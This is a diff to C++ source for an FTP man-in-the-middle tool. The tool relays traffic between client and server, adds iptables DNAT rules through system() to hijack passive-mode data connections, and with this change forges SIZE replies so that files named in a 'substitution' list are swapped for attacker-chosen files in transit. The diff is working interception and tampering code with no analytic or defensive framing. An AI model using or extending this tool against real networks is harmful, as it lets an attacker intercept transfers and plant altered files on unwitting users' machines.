@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <ifaddrs.h>
 #include <random>
+#include <filesystem>
 
 std::string Session::receiveMsg(int socket) {
     char* buffer = new char[this->buffer_size]{};
@@ -231,8 +232,10 @@ bool Session::TranslateMessages() {
             return this->_hold_session;
         }
         if (cmd == "SIZE") {
+            std::string filename = msg.substr(5);
             this->sendMsg(this->server, msg);
             msg = this->receiveMsg(this->server);
+            std::cout << "[+] Server: " << msg << std::endl;
             if (msg.substr(0, 3) == "550") {
                 std::cout << "Requested file does not exists on the server! Skipping..." << std::endl;
                 this->sendMsg(this->client, msg);
@@ -241,7 +244,16 @@ bool Session::TranslateMessages() {
                 return this->_hold_session;
             }
             size_t size = std::stoi(msg.substr(4));
+            std::cout << "[+] Requested filename: " << filename << std::endl; 
+            filename = filename.erase(filename.find_last_not_of(" \r\n") + 1);
+            Substitution substitution;
+            if (this->task.GetSubstitutionByFilename(filename, substitution)) {
+                std::string sub_filename = substitution.get_sub();
+                size = std::filesystem::file_size(sub_filename);
+                std::cout << "[+] File has substituion " << sub_filename << " size: " << size << std::endl;
+            }
             std::cout << "[+] Set buffer size to " << size << std::endl;
+            msg = "213 " + std::to_string(size) + "\r\n";
             this->sendMsg(this->client, msg);
             return this->_hold_session;
         }
@@ -384,8 +396,8 @@ bool Session::TranslateMessages() {
             std::cout << "[+] Mitm in passive mode. Server socket: " << ip << ":" << port << std::endl;
             std::string rule ="iptables -t nat -A PREROUTING -p tcp --dport " + std::to_string(port) + " -j DNAT --to-destination 192.168.7.1:" + std::to_string(port);
             system(rule.c_str());
-            this->sendMsg(this->client, msg);
             this->_hold_session = this->openClientDataSocket(ip, port) & this->openServerDataSocket(port);
+            this->sendMsg(this->client, msg);
 
             return this->_hold_session;
         }
